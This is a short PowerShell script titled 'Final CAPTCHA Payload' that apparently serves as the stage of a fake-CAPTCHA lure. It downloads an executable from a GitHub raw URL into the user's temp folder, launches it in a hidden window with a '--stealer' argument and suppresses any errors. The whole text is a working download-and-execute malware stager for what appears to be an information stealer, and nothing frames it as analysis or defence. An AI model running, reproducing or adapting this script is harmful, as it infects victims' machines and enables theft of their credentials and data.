# Final CAPTCHA Payload
$exe = "$env:TEMP\Omena.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/refs/heads/main/Omena.exe"

try {
    (New-Object Net.WebClient).DownloadFile($url, $exe)
    Start-Process $exe -ArgumentList '--stealer' -WindowStyle Hidden
} catch {
    # Silent
}
